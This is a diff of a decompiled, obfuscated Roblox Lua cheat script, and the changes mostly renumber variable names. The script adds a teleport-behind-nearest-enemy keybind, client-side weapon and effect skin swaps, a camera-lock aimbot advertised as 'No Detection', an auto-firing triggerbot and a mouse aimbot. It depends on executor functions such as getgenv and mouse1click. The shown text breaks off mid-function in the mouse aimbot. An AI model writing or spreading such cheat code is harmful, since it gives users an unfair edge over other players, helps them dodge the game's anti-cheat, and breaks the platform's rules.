+Keybind = u67.Nono:AddKeybind('Keybind', {
     Title = 'KeyBind',
     Mode = 'Toggle',
     Default = 'N',
-    Callback = function(p580)
-        isKeyPressed = p580
+    Callback = function(p576)
+        isKeyPressed = p576
     end,
-    ChangedCallback = function(p581)
-        keybindKey = p581
+    ChangedCallback = function(p577)
+        keybindKey = p577
     end,
 })
 
 function getClosestPlayerToScreenCenter()
-    local v582 = nil
+    local v578 = nil
     local _huge4 = math.huge
-    local v584 = Vector2.new(_CurrentCamera2.ViewportSize.X / 2, _CurrentCamera2.ViewportSize.Y / 2)
+    local v580 = Vector2.new(_CurrentCamera2.ViewportSize.X / 2, _CurrentCamera2.ViewportSize.Y / 2)
     local _Character7 = _LocalPlayer8.Character
 
     if _Character7 then
@@ -3147,28 +3192,28 @@ function getClosestPlayerToScreenCenter()
         return nil
     end
 
-    local v586 = _Players7
-    local v587, v588, v589 = ipairs(v586:GetPlayers())
+    local v582 = _Players7
+    local v583, v584, v585 = ipairs(v582:GetPlayers())
 
     while true do
-        local v590
+        local v586
 
-        v589, v590 = v587(v588, v589)
+        v585, v586 = v583(v584, v585)
 
-        if v589 == nil then
+        if v585 == nil then
             break
         end
-        if v590 ~= _LocalPlayer8 and v590.Character and v590.Character:FindFirstChild('HumanoidRootPart') then
-            local _HumanoidRootPart7 = v590.Character.HumanoidRootPart
+        if v586 ~= _LocalPlayer8 and v586.Character and v586.Character:FindFirstChild('HumanoidRootPart') then
+            local _HumanoidRootPart7 = v586.Character.HumanoidRootPart
 
             if (_HumanoidRootPart7.Position - _Character7.Position).Magnitude <= 350 then
-                local v592, v593 = _CurrentCamera2:WorldToViewportPoint(_HumanoidRootPart7.Position)
+                local v588, v589 = _CurrentCamera2:WorldToViewportPoint(_HumanoidRootPart7.Position)
 
-                if v593 then
-                    local _Magnitude7 = (Vector2.new(v592.X, v592.Y) - v584).Magnitude
+                if v589 then
+                    local _Magnitude7 = (Vector2.new(v588.X, v588.Y) - v580).Magnitude
 
                     if _Magnitude7 < _huge4 then
-                        v582 = v590
+                        v578 = v586
                         _huge4 = _Magnitude7
                     end
                 end
@@ -3176,15 +3221,15 @@ function getClosestPlayerToScreenCenter()
         end
     end
 
-    if v582 then
-        u67:Notify({
+    if v578 then
+        u65:Notify({
             Title = 'Slide Notification',
-            Content = 'Teleporting to: ' .. v582.Name,
+            Content = 'Teleporting to: ' .. v578.Name,
             SubContent = 'Closest player identified',
             Duration = 2,
         })
     else
-        u67:Notify({
+        u65:Notify({
             Title = 'Slide Notification',
             Content = 'No valid player found to teleport to.',
             SubContent = 'Please try again later.',
@@ -3192,19 +3237,19 @@ function getClosestPlayerToScreenCenter()
         })
     end
 
-    return v582
+    return v578
 end
-function moveToBackAbovePlayer(p595)
-    local _HumanoidRootPart8 = p595.Character.HumanoidRootPart
+function moveToBackAbovePlayer(p591)
+    local _HumanoidRootPart8 = p591.Character.HumanoidRootPart
     local _HumanoidRootPart9 = _LocalPlayer8.Character.HumanoidRootPart
 
     moveConnection = _RunService8.RenderStepped:Connect(function()
         if isMoving then
-            local v598 = _HumanoidRootPart8.Position - _HumanoidRootPart8.CFrame.LookVector * tweenDistanceBehind + Vector3.new(0, tweenDistanceAbove, 0)
-            local _unit = (v598 - _HumanoidRootPart9.Position).unit
+            local v594 = _HumanoidRootPart8.Position - _HumanoidRootPart8.CFrame.LookVector * tweenDistanceBehind + Vector3.new(0, tweenDistanceAbove, 0)
+            local _unit = (v594 - _HumanoidRootPart9.Position).unit
 
-            if (v598 - _HumanoidRootPart9.Position).magnitude <= 0 then
-                _HumanoidRootPart9.CFrame = CFrame.new(v598)
+            if (v594 - _HumanoidRootPart9.Position).magnitude <= 0 then
+                _HumanoidRootPart9.CFrame = CFrame.new(v594)
             else
                 _HumanoidRootPart9.CFrame = _HumanoidRootPart9.CFrame + _unit * speed * _RunService8.Heartbeat:Wait()
             end
@@ -3219,19 +3264,19 @@ function stopMoving()
     isMoving = false
 end
 
-_UserInputService2.InputBegan:Connect(function(p600, p601)
-    if not p601 then
-        local v602 = _SlideEnm.Value and p600.KeyCode == keybindKey and not isMoving and getClosestPlayerToScreenCenter()
+_UserInputService2.InputBegan:Connect(function(p596, p597)
+    if not p597 then
+        local v598 = _SlideEnm.Value and p596.KeyCode == keybindKey and not isMoving and getClosestPlayerToScreenCenter()
 
-        if v602 then
+        if v598 then
             isMoving = true
 
-            moveToBackAbovePlayer(v602)
+            moveToBackAbovePlayer(v598)
         end
-        if p600.KeyCode ~= Enum.KeyCode.Up then
-            if p600.KeyCode ~= Enum.KeyCode.Down then
-                if p600.KeyCode ~= Enum.KeyCode.Right then
-                    if p600.KeyCode == Enum.KeyCode.Left then
+        if p596.KeyCode ~= Enum.KeyCode.Up then
+            if p596.KeyCode ~= Enum.KeyCode.Down then
+                if p596.KeyCode ~= Enum.KeyCode.Right then
+                    if p596.KeyCode == Enum.KeyCode.Left then
                         tweenDistanceAbove = math.max(tweenDistanceAbove - 1, 1)
                     end
                 else
@@ -3245,8 +3290,8 @@ _UserInputService2.InputBegan:Connect(function(p600, p601)
         end
     end
 end)
-_UserInputService2.InputEnded:Connect(function(p603)
-    if p603.KeyCode == keybindKey then
+_UserInputService2.InputEnded:Connect(function(p599)
+    if p599.KeyCode == keybindKey then
         stopMoving()
     end
 end)
@@ -3256,13 +3301,13 @@ local _MuzzleFlashes = _LocalPlayer10.PlayerScripts.Assets:WaitForChild('Misc'):
 local _Default = _MuzzleFlashes:FindFirstChild('Default')
 
 if _Default then
-    local v607 = _Default:Clone()
+    local v603 = _Default:Clone()
 
-    v607.Name = 'Muzzle Flash Original'
-    v607.Parent = _MuzzleFlashes
+    v603.Name = 'Muzzle Flash Original'
+    v603.Parent = _MuzzleFlashes
 end
 
-u69.Skinz:AddDropdown('MuzzleFlashDropdown', {
+u67.Skinz:AddDropdown('MuzzleFlashDropdown', {
     Title = 'Fire Effect [Bullet]',
     Values = {
         'None',
@@ -3277,29 +3322,29 @@ u69.Skinz:AddDropdown('MuzzleFlashDropdown', {
     },
     Multi = false,
     Default = 1,
-}):OnChanged(function(p608)
-    local v609 = _MuzzleFlashes:FindFirstChild('Default') or _MuzzleFlashes:FindFirstChild('Muzzle Flash Original')
+}):OnChanged(function(p604)
+    local v605 = _MuzzleFlashes:FindFirstChild('Default') or _MuzzleFlashes:FindFirstChild('Muzzle Flash Original')
 
-    if v609 then
-        v609:Destroy()
+    if v605 then
+        v605:Destroy()
     end
-    if p608 == 'None' then
+    if p604 == 'None' then
         local _MuzzleFlashOriginal = _MuzzleFlashes:FindFirstChild('Muzzle Flash Original')
 
         if _MuzzleFlashOriginal then
-            local v611 = _MuzzleFlashOriginal:Clone()
+            local v607 = _MuzzleFlashOriginal:Clone()
 
-            v611.Parent = _MuzzleFlashes
-            v611.Name = 'Default'
+            v607.Parent = _MuzzleFlashes
+            v607.Name = 'Default'
         end
     else
-        local v612 = _MuzzleFlashes:FindFirstChild(p608)
+        local v608 = _MuzzleFlashes:FindFirstChild(p604)
 
-        if v612 then
-            local v613 = v612:Clone()
+        if v608 then
+            local v609 = v608:Clone()
 
-            v613.Parent = _MuzzleFlashes
-            v613.Name = 'Default'
+            v609.Parent = _MuzzleFlashes
+            v609.Name = 'Default'
         end
     end
 end)
@@ -3310,22 +3355,22 @@ local _FireHitboxes = _Misc:WaitForChild('FireHitboxes')
 local _Default2 = _BurningEffects:FindFirstChild('Default')
 
 if _Default2 then
-    local v618 = _Default2:Clone()
+    local v614 = _Default2:Clone()
 
-    v618.Name = 'Burning Effect Original'
-    v618.Parent = _BurningEffects
+    v614.Name = 'Burning Effect Original'
+    v614.Parent = _BurningEffects
 end
 
 local _Default3 = _FireHitboxes:FindFirstChild('Default')
 
 if _Default3 then
-    local v620 = _Default3:Clone()
+    local v616 = _Default3:Clone()
 
-    v620.Name = 'Fire Hitbox Original'
-    v620.Parent = _FireHitboxes
+    v616.Name = 'Fire Hitbox Original'
+    v616.Parent = _FireHitboxes
 end
 
-u69.Skinz:AddDropdown('FireEffectDropdown', {
+u67.Skinz:AddDropdown('FireEffectDropdown', {
     Title = 'Moltov Fire ',
     Values = {
         'None',
@@ -3333,57 +3378,57 @@ u69.Skinz:AddDropdown('FireEffectDropdown', {
     },
     Multi = false,
     Default = 1,
-}):OnChanged(function(p621)
-    local v622 = _BurningEffects:FindFirstChild('Default') or _BurningEffects:FindFirstChild('Burning Effect Original')
-    local v623 = _FireHitboxes:FindFirstChild('Default') or _FireHitboxes:FindFirstChild('Fire Hitbox Original')
+}):OnChanged(function(p617)
+    local v618 = _BurningEffects:FindFirstChild('Default') or _BurningEffects:FindFirstChild('Burning Effect Original')
+    local v619 = _FireHitboxes:FindFirstChild('Default') or _FireHitboxes:FindFirstChild('Fire Hitbox Original')
 
-    if v622 then
-        v622:Destroy()
+    if v618 then
+        v618:Destroy()
     end
-    if v623 then
-        v623:Destroy()
+    if v619 then
+        v619:Destroy()
     end
-    if p621 == 'Hexxed Candle' then
+    if p617 == 'Hexxed Candle' then
         local _HexxedCandle = _BurningEffects:FindFirstChild('Hexxed Candle')
         local _HexxedCandle2 = _FireHitboxes:FindFirstChild('Hexxed Candle')
 
         if _HexxedCandle then
-            local v626 = _HexxedCandle:Clone()
+            local v622 = _HexxedCandle:Clone()
 
-            v626.Name = 'Default'
-            v626.Parent = _BurningEffects
+            v622.Name = 'Default'
+            v622.Parent = _BurningEffects
         end
         if _HexxedCandle2 then
-            local v627 = _HexxedCandle2:Clone()
+            local v623 = _HexxedCandle2:Clone()
 
-            v627.Name = 'Default'
-            v627.Parent = _FireHitboxes
+            v623.Name = 'Default'
+            v623.Parent = _FireHitboxes
         end
     else
         local _BurningEffectOriginal = _BurningEffects:FindFirstChild('Burning Effect Original')
         local _FireHitboxOriginal = _FireHitboxes:FindFirstChild('Fire Hitbox Original')
 
         if _BurningEffectOriginal then
-            local v630 = _BurningEffectOriginal:Clone()
+            local v626 = _BurningEffectOriginal:Clone()
 
-            v630.Name = 'Default'
-            v630.Parent = _BurningEffects
+            v626.Name = 'Default'
+            v626.Parent = _BurningEffects
         end
         if _FireHitboxOriginal then
-            local v631 = _FireHitboxOriginal:Clone()
+            local v627 = _FireHitboxOriginal:Clone()
 
-            v631.Name = 'Default'
-            v631.Parent = _FireHitboxes
+            v627.Name = 'Default'
+            v627.Parent = _FireHitboxes
         end
     end
 end)
-u69.Skinz:AddSection('Gun Skin')
+u67.Skinz:AddSection('Gun Skin')
 
 local _LocalPlayer11 = game:GetService('Players').LocalPlayer
 local _Assets = _LocalPlayer11.PlayerScripts.Assets
 local _ViewModels = _Assets:WaitForChild('ViewModels')
 local _Throwables = _Assets:WaitForChild('Throwables')
-local u636 = {
+local u632 = {
     'Festive Skin Case',
     'Other',
     'Skin Case',
@@ -3391,39 +3436,39 @@ local u636 = {
     'Spooky Skin Case',
 }
 
-local function v641(p637, p638, p639)
-    if p637 then
-        local v640 = p637:Clone()
+local function v637(p633, p634, p635)
+    if p633 then
+        local v636 = p633:Clone()
 
-        v640.Name = p639
-        v640.Parent = p638
+        v636.Name = p635
+        v636.Parent = p634
     end
 end
-local function u651(p642, p643)
-    local v644 = p643:FindFirstChild(p642)
+local function u647(p638, p639)
+    local v640 = p639:FindFirstChild(p638)
 
-    if v644 then
-        return v644
+    if v640 then
+        return v640
     end
-    if p643 == _ViewModels then
-        local v645, v646, v647 = ipairs(u636)
+    if p639 == _ViewModels then
+        local v641, v642, v643 = ipairs(u632)
 
         while true do
-            local v648
+            local v644
 
-            v647, v648 = v645(v646, v647)
+            v643, v644 = v641(v642, v643)
 
-            if v647 == nil then
+            if v643 == nil then
                 break
             end
 
-            local v649 = _ViewModels:FindFirstChild(v648)
+            local v645 = _ViewModels:FindFirstChild(v644)
 
-            if v649 then
-                local v650 = v649:FindFirstChild(p642)
+            if v645 then
+                local v646 = v645:FindFirstChild(p638)
 
-                if v650 then
-                    return v650
+                if v646 then
+                    return v646
                 end
             end
         end
@@ -3431,34 +3476,34 @@ local function u651(p642, p643)
 
     return nil
 end
-local function u659(p652, p653, p654, p655)
-    local v656 = p654:FindFirstChild(p652)
+local function u655(p648, p649, p650, p651)
+    local v652 = p650:FindFirstChild(p648)
 
-    if v656 then
-        v656:Destroy()
+    if v652 then
+        v652:Destroy()
     end
 
-    local v657 = u651(p653 == 'None' and p655 and p655 or p653, p654)
+    local v653 = u647(p649 == 'None' and p651 and p651 or p649, p650)
 
-    if v657 then
-        local v658 = v657:Clone()
+    if v653 then
+        local v654 = v653:Clone()
 
-        v658.Name = p652
-        v658.Parent = p654
+        v654.Name = p648
+        v654.Parent = p650
     end
 end
-local function v665(p660, p661, p662, p663)
-    u69.Skinz:AddDropdown(p660 .. 'Dropdown', {
-        Title = p661,
-        Values = p662,
+local function v661(p656, p657, p658, p659)
+    u67.Skinz:AddDropdown(p656 .. 'Dropdown', {
+        Title = p657,
+        Values = p658,
         Multi = false,
         Default = 1,
-    }):OnChanged(function(p664)
-        u659(p660, p664, p663, p660 .. ' Original')
+    }):OnChanged(function(p660)
+        u655(p656, p660, p659, p656 .. ' Original')
     end)
 end
 
-local v666, v667, v668 = ipairs({
+local v662, v663, v664 = ipairs({
     {
         'Assault Rifle',
         'Assault Rifle Original',
@@ -3619,48 +3664,48 @@ local v666, v667, v668 = ipairs({
         },
     },
 })
-local u669 = _CoreGui2
-local u670 = u659
-local v671 = _RunService8
-local u672 = _Workspace
-local u673 = _ViewModels
+local u665 = _CoreGui2
+local u666 = u655
+local v667 = _RunService8
+local u668 = _Workspace
+local u669 = _ViewModels
 
 while true do
-    local v674, v675 = v666(v667, v668)
+    local v670, v671 = v662(v663, v664)
 
-    if v674 == nil then
+    if v670 == nil then
         break
     end
 
-    v668 = v674
+    v664 = v670
 
-    local v676 = u673:FindFirstChild(v675[1])
+    local v672 = u669:FindFirstChild(v671[1])
 
-    if v676 then
-        v641(v676, u673, v675[2])
-        v665(v675[1], v675[1], v675[3], u673)
+    if v672 then
+        v637(v672, u669, v671[2])
+        v661(v671[1], v671[1], v671[3], u669)
     end
 end
 
-v641(u673:FindFirstChild('Grenade'), u673, 'Grenade Original')
-v641(_Throwables:FindFirstChild('Grenade'), _Throwables, 'Grenade Original')
-v641(u673:FindFirstChild('Molotov'), u673, 'Molotov Original')
-v641(_Throwables:FindFirstChild('Molotov'), _Throwables, 'Molotov Original')
-v665('Grenade', 'Grenade', {
+v637(u669:FindFirstChild('Grenade'), u669, 'Grenade Original')
+v637(_Throwables:FindFirstChild('Grenade'), _Throwables, 'Grenade Original')
+v637(u669:FindFirstChild('Molotov'), u669, 'Molotov Original')
+v637(_Throwables:FindFirstChild('Molotov'), _Throwables, 'Molotov Original')
+v661('Grenade', 'Grenade', {
     'None',
     'Whoopee Cushion',
     'Water Balloon',
     'Soul Grenade',
-}, u673)
-v665('Molotov', 'Molotov', {
+}, u669)
+v661('Molotov', 'Molotov', {
     'None',
     'Coffee',
     'Hexxed Candle',
     'Torch',
-}, u673)
-v641(u673:FindFirstChild('Scythe'), u673, 'Scythe Original')
-v641(_Throwables:FindFirstChild('Scythe'), _Throwables, 'Scythe Original')
-u69.Skinz:AddDropdown('ScytheDropdown', {
+}, u669)
+v637(u669:FindFirstChild('Scythe'), u669, 'Scythe Original')
+v637(_Throwables:FindFirstChild('Scythe'), _Throwables, 'Scythe Original')
+u67.Skinz:AddDropdown('ScytheDropdown', {
     Title = 'Scythe',
     Values = {
         'None',
@@ -3669,40 +3714,40 @@ u69.Skinz:AddDropdown('ScytheDropdown', {
     },
     Multi = false,
     Default = 1,
-}):OnChanged(function(p677)
-    u670('Scythe', p677, u673, 'Scythe Original')
-    u670('Scythe', p677, _Throwables, 'Scythe Original')
+}):OnChanged(function(p673)
+    u666('Scythe', p673, u669, 'Scythe Original')
+    u666('Scythe', p673, _Throwables, 'Scythe Original')
 end)
 
 local _Throwables2 = _LocalPlayer11.PlayerScripts.Assets:WaitForChild('Throwables')
 local _SmokeClouds = _LocalPlayer11.PlayerScripts.Assets.Misc.SmokeClouds
 
-local function u684(p680, p681, p682)
-    if p680 then
-        local v683 = p680:Clone()
+local function u680(p676, p677, p678)
+    if p676 then
+        local v679 = p676:Clone()
 
-        v683.Name = p682
-        v683.Parent = p681
+        v679.Name = p678
+        v679.Parent = p677
     end
 end
-local function u688(p685, p686)
-    local v687 = p685:FindFirstChild(p686)
+local function u684(p681, p682)
+    local v683 = p681:FindFirstChild(p682)
 
-    if v687 then
-        v687:Destroy()
+    if v683 then
+        v683:Destroy()
     end
 end
 
-u684(u673:FindFirstChild('Smoke Grenade'), u673, 'Smoke Grenade Original')
+u680(u669:FindFirstChild('Smoke Grenade'), u669, 'Smoke Grenade Original')
 
-local v689 = _Throwables2
+local v685 = _Throwables2
 
-u684(_Throwables2.FindFirstChild(v689, 'Smoke Grenade'), _Throwables2, 'Smoke Grenade Original')
+u680(_Throwables2.FindFirstChild(v685, 'Smoke Grenade'), _Throwables2, 'Smoke Grenade Original')
 
-local v690 = _SmokeClouds
+local v686 = _SmokeClouds
 
-u684(_SmokeClouds.FindFirstChild(v690, 'Default'), _SmokeClouds, 'Smoke Grenade Original')
-u69.Skinz:AddDropdown('SmokeGrenadeDropdown', {
+u680(_SmokeClouds.FindFirstChild(v686, 'Default'), _SmokeClouds, 'Smoke Grenade Original')
+u67.Skinz:AddDropdown('SmokeGrenadeDropdown', {
     Title = 'Smoke Grenade ',
     Values = {
         'None',
@@ -3711,19 +3756,19 @@ u69.Skinz:AddDropdown('SmokeGrenadeDropdown', {
     },
     Multi = false,
     Default = 3,
-}):OnChanged(function(p691)
-    u688(u673, 'Smoke Grenade')
-    u688(u673, 'Smoke Grenade Original')
-    u688(_Throwables2, 'Smoke Grenade')
-    u688(_Throwables2, 'Smoke Grenade Original')
-    u688(_SmokeClouds, 'Default')
-    u688(_SmokeClouds, 'Smoke Grenade Original')
+}):OnChanged(function(p687)
+    u684(u669, 'Smoke Grenade')
+    u684(u669, 'Smoke Grenade Original')
+    u684(_Throwables2, 'Smoke Grenade')
+    u684(_Throwables2, 'Smoke Grenade Original')
+    u684(_SmokeClouds, 'Default')
+    u684(_SmokeClouds, 'Smoke Grenade Original')
 
-    local v692 = p691 == 'None' and ('Smoke Grenade Original' or p691) or p691
+    local v688 = p687 == 'None' and ('Smoke Grenade Original' or p687) or p687
 
-    u684(u673:FindFirstChild(v692), u673, 'Smoke Grenade')
-    u684(_Throwables2:FindFirstChild(v692), _Throwables2, 'Smoke Grenade')
-    u684(_SmokeClouds:FindFirstChild(v692), _SmokeClouds, 'Default')
+    u680(u669:FindFirstChild(v688), u669, 'Smoke Grenade')
+    u680(_Throwables2:FindFirstChild(v688), _Throwables2, 'Smoke Grenade')
+    u680(_SmokeClouds:FindFirstChild(v688), _SmokeClouds, 'Default')
 end)
 
 function InitializeAimbotSystem3()
@@ -3733,116 +3778,116 @@ function InitializeAimbotSystem3()
     local _Players8 = game:GetService('Players')
     local _RunService9 = game:GetService('RunService')
     local _LocalPlayer12 = _Players8.LocalPlayer
-    local u699 = {
+    local u695 = {
         Enabled = false,
         HitChance = 100,
         NotWorkIfFlashed = true,
     }
-    local u700 = false
-    local u701 = nil
+    local u696 = false
+    local u697 = nil
     local _MouseButton22 = Enum.UserInputType.MouseButton2
 
-    local function u716()
-        local v703 = _UserInputService3:GetMouseLocation()
+    local function u712()
+        local v699 = _UserInputService3:GetMouseLocation()
         local _huge5 = math.huge
-        local v705 = _Players8
-        local v706, v707, v708 = pairs(v705:GetPlayers())
-        local v709 = nil
+        local v701 = _Players8
+        local v702, v703, v704 = pairs(v701:GetPlayers())
+        local v705 = nil
 
         while true do
-            local v710
+            local v706
 
-            v708, v710 = v706(v707, v708)
+            v704, v706 = v702(v703, v704)
 
-            if v708 == nil then
+            if v704 == nil then
                 break
             end
 
-            local _Character8 = v710.Character
-            local _Character9 = v710.Character
+            local _Character8 = v706.Character
+            local _Character9 = v706.Character
 
             if _Character9 then
-                _Character9 = v710.Character:FindFirstChild('HumanoidRootPart')
+                _Character9 = v706.Character:FindFirstChild('HumanoidRootPart')
             end
-            if v710 ~= _LocalPlayer12 and _Character8 and (_Character9 and not _Character9:FindFirstChild('TeammateLabel')) then
-                local v713, v714 = _Workspace2.CurrentCamera:WorldToViewportPoint(_Character9.Position)
-                local v715 = v714 and (Vector2.new(v713.X, v713.Y) - v703).Magnitude or math.huge
+            if v706 ~= _LocalPlayer12 and _Character8 and (_Character9 and not _Character9:FindFirstChild('TeammateLabel')) then
+                local v709, v710 = _Workspace2.CurrentCamera:WorldToViewportPoint(_Character9.Position)
+                local v711 = v710 and (Vector2.new(v709.X, v709.Y) - v699).Magnitude or math.huge
 
-                if v715 < _huge5 then
-                    v709 = v710
-                    _huge5 = v715
+                if v711 < _huge5 then
+                    v705 = v706
+                    _huge5 = v711
                 end
             end
         end
 
-        return v709
+        return v705
     end
-    local function u719(p717)
-        local _Character10 = p717.Character
+    local function u715(p713)
+        local _Character10 = p713.Character
 
         if _Character10 then
-            _Character10 = p717.Character:FindFirstChild('Head')
+            _Character10 = p713.Character:FindFirstChild('Head')
         end
 
         return _Character10
     end
-    local function u721(p720)
-        _Workspace2.CurrentCamera.CFrame = CFrame.lookAt(_Workspace2.CurrentCamera.CFrame.Position, p720.Position)
+    local function u717(p716)
+        _Workspace2.CurrentCamera.CFrame = CFrame.lookAt(_Workspace2.CurrentCamera.CFrame.Position, p716.Position)
     end
-    local function u723()
-        u701 = u716()
+    local function u719()
+        u697 = u712()
 
-        while u700 and (u699.Enabled and u701) do
+        while u696 and (u695.Enabled and u697) do
             if getgenv().state ~= 2 then
-                u700 = false
+                u696 = false
 
                 return
             end
 
-            local v722 = (math.random(0, 100) <= u699.HitChance and not (u699.NotWorkIfFlashed and _Lighting2:FindFirstChild('Flashbang')) and true or false) and u719(u701)
+            local v718 = (math.random(0, 100) <= u695.HitChance and not (u695.NotWorkIfFlashed and _Lighting2:FindFirstChild('Flashbang')) and true or false) and u715(u697)
 
-            if v722 then
-                u721(v722)
+            if v718 then
+                u717(v718)
             end
 
             _RunService9.RenderStepped:Wait()
         end
     end
 
-    _UserInputService3.InputBegan:Connect(function(p724, p725)
-        if not p725 and (p724.KeyCode == _MouseButton22 or p724.UserInputType == _MouseButton22) then
-            u700 = true
+    _UserInputService3.InputBegan:Connect(function(p720, p721)
+        if not p721 and (p720.KeyCode == _MouseButton22 or p720.UserInputType == _MouseButton22) then
+            u696 = true
 
-            task.spawn(u723)
+            task.spawn(u719)
         end
     end)
-    _UserInputService3.InputEnded:Connect(function(p726)
-        if p726.KeyCode == _MouseButton22 or p726.UserInputType == _MouseButton22 then
-            u701 = nil
-            u700 = false
+    _UserInputService3.InputEnded:Connect(function(p722)
+        if p722.KeyCode == _MouseButton22 or p722.UserInputType == _MouseButton22 then
+            u697 = nil
+            u696 = false
         end
     end)
 
-    cas = u69.AimTab:AddSection('Camera Aimbot')
+    cas = u67.AimTab:AddSection('Camera Aimbot')
 
-    u69.AimTab:AddKeybind('CamAimKeybind3', {
+    u67.AimTab:AddKeybind('CamAimKeybind3', {
         Title = 'Cam lock KeyBind',
         Mode = 'Toggle',
         Default = 'MouseRight',
         Callback = function(_) end,
-        ChangedCallback = function(p727)
-            _MouseButton22 = p727
+        ChangedCallback = function(p723)
+            _MouseButton22 = p723
         end,
     })
 
-    local _CamToggle3 = u69.AimTab:AddToggle('CamToggle3', {
+    local _CamToggle3 = u67.AimTab:AddToggle('CamToggle3', {
         Title = 'Cam Aimbo',
         Description = '\u{25cf} No Detection\n\u{25cf} Less Missfire',
         Default = false,
     })
-    local v729 = _CamToggle3
+    local v725 = _CamToggle3
 
-    _CamToggle3.OnChanged(v729, function()
+    _CamToggle3.OnChanged(v725, function()
         if textLabels and textLabels.textLabel3 then
             textLabels.textLabel3.Visible = _Options.CamToggle3.Value
 
@@ -3850,153 +3895,153 @@ function InitializeAimbotSystem3()
             alignTextLabels()
         end
 
-        u699.Enabled = _CamToggle3.Value
+        u695.Enabled = _CamToggle3.Value
     end)
 
-    local _AimMob3 = u69.AimTab:AddToggle('AimMob3', {
+    local _AimMob3 = u67.AimTab:AddToggle('AimMob3', {
         Title = 'Mobile Aimbot',
         Description = 'For Mobile, also works on computer. Set FOV to 120. (Must)',
         Default = false,
     })
-    local v731 = _AimMob3
+    local v727 = _AimMob3
 
-    _AimMob3.OnChanged(v731, function()
+    _AimMob3.OnChanged(v727, function()
         getgenv().MobileAimbot = _AimMob3.Value
     end)
 end
 
 InitializeAimbotSystem3()
 
-local _TbotToggle = u69.AimTab:AddToggle('TbotToggle', {
+local _TbotToggle = u67.AimTab:AddToggle('TbotToggle', {
     Title = 'Triggerbot',
     Description = 'Auto shoots when enemy on point.',
     Default = false,
 })
 local _LocalPlayer13 = game:GetService('Players').LocalPlayer
-local _CurrentCamera7 = u672.CurrentCamera
-local u735 = false
+local _CurrentCamera7 = u668.CurrentCamera
+local u731 = false
 
 _TbotToggle:OnChanged(function()
-    u735 = _Options.TbotToggle.Value
+    u731 = _Options.TbotToggle.Value
 end)
 
-local function u742()
+local function u738()
     local _Position5 = _CurrentCamera7.CFrame.Position
-    local v737 = _CurrentCamera7.CFrame.LookVector * 1000
-    local v738 = RaycastParams.new()
+    local v733 = _CurrentCamera7.CFrame.LookVector * 1000
+    local v734 = RaycastParams.new()
     local _Blacklist = Enum.RaycastFilterType.Blacklist
 
-    v738.FilterDescendantsInstances = {
+    v734.FilterDescendantsInstances = {
         _LocalPlayer13.Character,
     }
-    v738.FilterType = _Blacklist
+    v734.FilterType = _Blacklist
 
-    local v740 = workspace:Raycast(_Position5, v737, v738)
+    local v736 = workspace:Raycast(_Position5, v733, v734)
 
-    if v740 then
-        v740 = v740.Instance:FindFirstAncestorOfClass('Model')
+    if v736 then
+        v736 = v736.Instance:FindFirstAncestorOfClass('Model')
     end
 
-    local v741 = v740 and v740:FindFirstChild('Humanoid')
+    local v737 = v736 and v736:FindFirstChild('Humanoid')
 
-    if v741 then
-        v741 = v740.Name ~= _LocalPlayer13.Name
+    if v737 then
+        v737 = v736.Name ~= _LocalPlayer13.Name
     end
 
-    return v741
+    return v737
 end
 
-v671.RenderStepped:Connect(function()
-    if u735 and (getgenv().state == 2 and u742()) then
+v667.RenderStepped:Connect(function()
+    if u731 and (getgenv().state == 2 and u738()) then
         mouse1click()
     end
 end)
 
-mas = u69.AimTab:AddSection('Mouse Aimbot')
+mas = u67.AimTab:AddSection('Mouse Aimbot')
 
 function InitializeAimbot2()
-    local u743 = false
+    local u739 = false
     local _MouseButton23 = Enum.UserInputType.MouseButton2
-    local u745 = 'Head'
-    local u746 = 100
-    local u747 = 5
+    local u741 = 'Head'
+    local u742 = 100
+    local u743 = 5
+    local u744 = false
+    local u745 = false
+    local u746 = 0
+    local u747 = 0
     local u748 = false
     local u749 = false
-    local u750 = 0
-    local u751 = 0
-    local u752 = false
-    local u753 = false
-    local u754 = nil
+    local u750 = nil
     local _RunService10 = game:GetService('RunService')
     local _UserInputService4 = game:GetService('UserInputService')
     local _Players9 = game:GetService('Players')
     local _LocalPlayer14 = _Players9.LocalPlayer
     local _CurrentCamera8 = workspace.CurrentCamera
 
-    local function u771()
-        local v760 = u746
-        local v761 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
-        local v762 = _Players9
-        local v763, v764, v765 = pairs(v762:GetPlayers())
-        local v766 = nil
+    local function u767()
+        local v756 = u742
+        local v757 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
+        local v758 = _Players9
+        local v759, v760, v761 = pairs(v758:GetPlayers())
+        local v762 = nil
 
         while true do
-            local v767
+            local v763
 
-            v765, v767 = v763(v764, v765)
+            v761, v763 = v759(v760, v761)
 
-            if v765 == nil then
+            if v761 == nil then
                 break
             end
-            if v767 ~= _LocalPlayer14 and v767.Character and v767.Character:FindFirstChild(u745) then
-                local v768, v769 = _CurrentCamera8:WorldToViewportPoint(v767.Character[u745].Position)
+            if v763 ~= _LocalPlayer14 and v763.Character and v763.Character:FindFirstChild(u741) then
+                local v764, v765 = _CurrentCamera8:WorldToViewportPoint(v763.Character[u741].Position)
 
-                if v769 then
-                    local _Magnitude8 = (Vector2.new(v768.X, v768.Y) - v761).Magnitude
+                if v765 then
+                    local _Magnitude8 = (Vector2.new(v764.X, v764.Y) - v757).Magnitude
 
-                    if _Magnitude8 < v760 then
-                        v766 = v767
-                        v760 = _Magnitude8
+                    if _Magnitude8 < v756 then
+                        v762 = v763
+                        v756 = _Magnitude8
                     end
                 end
             end
         end
 
-        return v766
+        return v762
     end
-    local function v782()
-        if u743 then
+    local function v778()
+        if u739 then
             if getgenv().state == 2 then
                 if _MouseButton23 ~= Enum.UserInputType.MouseButton2 then
                     if not _UserInputService4:IsKeyDown(_MouseButton23) then
-                        u754 = nil
+                        u750 = nil
 
                         return
                     end
                 elseif not _UserInputService4:IsMouseButtonPressed(_MouseButton23) then
-                    u754 = nil
+                    u750 = nil
 
                     return
                 end
-                if u754 and u752 and u754.Character and u754.Character:FindFirstChild(u745) then
-                    local v772 = _CurrentCamera8:WorldToViewportPoint(u754.Character[u745].Position)
-                    local v773 = Vector2.new(v772.X, v772.Y)
-                    local v774 = Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
-                    local v775 = v773 - v774
-                    local v776 = Vector2.new(v774.X + v775.X / (u747 + 1), v774.Y + v775.Y / (u747 + 1)) - Vector2.new(_CurrentCamera8.ViewportSize.X / 2, _CurrentCamera8.ViewportSize.Y / 2)
+                if u750 and u748 and u750.Character and u750.Character:FindFirstChild(u741) then
